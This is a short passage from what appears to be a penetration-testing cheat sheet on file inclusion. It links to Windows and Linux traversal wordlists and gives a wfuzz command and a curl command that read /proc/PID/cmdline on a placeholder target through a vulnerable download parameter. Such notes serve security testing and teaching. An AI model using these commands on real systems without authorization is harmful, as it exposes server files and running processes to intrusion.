### :open_file_folder: Windows

- https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt

### :open_file_folder: Linux

- https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt

### :open_file_folder: [Proc File System](https://www.netspi.com/blog/technical/web-application-penetration-testing/directory-traversal-file-inclusion-proc-file-system/)

```bash
wfuzz -u http://<target ip>/download.php?downloadurl=/proc/FUZZ/cmdline -z range,1-1000 --hw 1

curl http://<target ip>/download.php?downloadurl=/proc/824/cmdline --output service.txt
```